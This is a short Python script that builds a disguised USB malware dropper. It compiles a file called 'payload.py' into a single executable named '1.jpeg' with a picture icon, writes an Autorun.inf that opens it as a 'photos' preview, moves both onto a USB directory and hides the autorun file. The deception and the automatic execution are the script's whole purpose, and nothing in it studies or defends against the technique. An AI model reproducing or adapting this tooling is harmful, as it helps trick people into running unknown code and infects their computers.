import PyInstaller.__main__
import shutil
import os

filename = "payload.py"
exename = "1.jpeg"
icon = "jpg.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd, "")

if os.path.isfile(exename):
    os.remove(exename)

# Create executable from Python script
PyInstaller.__main__.run([
    "payload.py",
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name=" + exename,
    "--icon=" + icon
])

# Clean up after Pyinstaller
shutil.move(os.path.join(pwd, "dist", exename), pwd)
shutil.rmtree("dist")
shutil.rmtree("build")

if os.path.exists("__pycache__"):
    shutil.rmtree("__pycache__")

os.remove(exename + ".spec")

# Create Autorun File
with open("Autorun.inf", "w") as o:
    o.write("(Autorun)\n")
    o.write("Open=" + exename + "\n")
    o.write("Action=Start preview\n")
    o.write("Label=photos\n")
    o.write("Icon=" + exename + "\n")

# Move files to USB and set to hidden
shutil.move(exename, usbdir)
shutil.move("Autorun.inf", usbdir)
os.system("attrib +h " + os.path.join(usbdir, "Autorun.inf"))
